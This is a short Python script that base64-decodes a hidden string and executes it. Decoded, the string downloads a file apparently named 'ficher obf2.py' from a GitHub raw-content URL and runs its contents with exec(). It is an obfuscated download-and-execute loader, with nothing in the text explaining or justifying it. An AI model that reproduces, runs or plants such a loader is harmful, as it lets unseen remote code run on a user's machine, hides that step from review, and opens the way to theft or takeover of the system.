
import base64
import sys

encoded_code = """aW1wb3J0IHVybGxpYi5yZXF1ZXN0DQoNCnVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vdWF4cy8xMzM3L3JlZnMvaGVhZHMvbWFpbi9maWNoZXIlMjBvYmYyLnB5Ig0KZXhlYyh1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpLmRlY29kZSgpKQ0K"""
decoded_code = base64.b64decode(encoded_code).decode('utf-8')

exec(decoded_code)
